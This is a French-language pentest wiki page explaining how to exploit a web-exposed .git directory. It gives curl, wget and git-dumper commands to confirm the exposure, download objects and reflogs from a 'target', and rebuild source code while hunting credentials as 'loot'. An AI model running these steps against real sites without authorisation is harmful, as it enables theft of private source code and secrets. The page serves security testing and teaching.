---
title: "Répertoire .git exposé : reconstruire le code source depuis un dépôt servi par le web"
description: "Récupérer un répertoire .git exposé sur le web pour en tirer l'arborescence source complète : détecter l'exposition, télécharger les objets loose et packed avec et sans listing de répertoire, reconstruire l'arbre de travail avec git-dumper, et lire config et refs à la recherche d'identifiants et de détails internes."
keywords:
  - .git exposure
  - git-dumper
  - source code disclosure
  - packed objects
  - git checkout
---

# Répertoire .git exposé

Quand un déploiement copie un arbre de travail vers la racine web sans exclure `.git/`, le serveur livre l'intégralité de la base de données d'objets. Parce que Git est adressé par le contenu, cela suffit à reconstruire chaque fichier suivi au dernier commit (et généralement tout l'historique), récupérant du code source qui n'était jamais censé être public ainsi que le `config`, les URL de remote et tout secret qui a été commité.

## Identifier d'abord

`.git/HEAD` est l'indice le moins coûteux : il est minuscule, toujours présent, et son contenu est sans équivoque.

```bash
curl -s https://target/.git/HEAD        # => "ref: refs/heads/main"  (a ref line, not an HTML 404 page)
curl -s https://target/.git/config      # remote URLs, often credentials in the URL
```

Une ligne `ref:` (ou un SHA de 40 caractères) le confirme. Si la réponse est une page d'erreur HTML avec un `200`, le serveur a un catch-all et vous devez vérifier en récupérant un chemin d'objet connu plutôt qu'en vous fiant au code de statut.

## Avec listing de répertoire

Si le serveur liste les répertoires (`Options +Indexes`), recopiez tout le dossier en miroir :

```bash
wget -r -np -R 'index.html*' https://target/.git/
cd target && git checkout -- .          # materialize the working tree from the recovered objects
```

## Sans listing de répertoire

Le plus souvent le listing est désactivé, donc vous récupérez les chemins Git connus et parcourez le graphe d'objets. `git-dumper` automatise exactement cela : lire `.git/HEAD` et les refs, récupérer `objects/info/packs` et les fichiers pack index/pack, puis récupérer les objets loose par hash au fur et à mesure qu'ils sont découverts.

```bash
git-dumper https://target/.git/ loot/
cd loot && git log --oneline && git checkout -- .
```

En le faisant à la main, les chemins qui comptent sont `HEAD`, `config`, `packed-refs`, `logs/HEAD` (le reflog, qui nomme des commits vers lesquels aucune ref ne pointe), `objects/info/packs`, chaque `objects/pack/pack-<sha>.idx` et `.pack`, et les objets loose à `objects/<first2>/<rest38>`. Un objet loose est compressé en zlib ; `git cat-file -p <sha>` le décode une fois qu'il est dans un `.git` local.

```bash
# the reflog reveals commit SHAs even for branches that were deleted or force-pushed
curl -s https://target/.git/logs/HEAD
git cat-file -p <sha>                   # read a recovered commit/tree/blob
```

## Que lire en premier

- `config` et `logs/HEAD` donnent les URL de remote et l'historique complet des refs, y compris les branches supprimées.
- `git log -p` à travers l'historique récupéré est là où se trouve le vrai butin, alimentez-le vers [secrets dans l'historique](secrets-in-history.md).
- Le code source lui-même est la carte de l'étape suivante : endpoints codés en dur, identifiants et les propres vulnérabilités de l'application.

## Outils

- [git-dumper](https://github.com/arthaud/git-dumper) : récupérer un `.git` sans listing de répertoire.
- [GoGitDumper / goop](https://github.com/nyancrimew/goop) : dumpers alternatifs qui brute-forcent les chemins d'objets courants.

## Références

- [Git internals: the object database](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects)
- [HackTricks: exposed .git](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html)
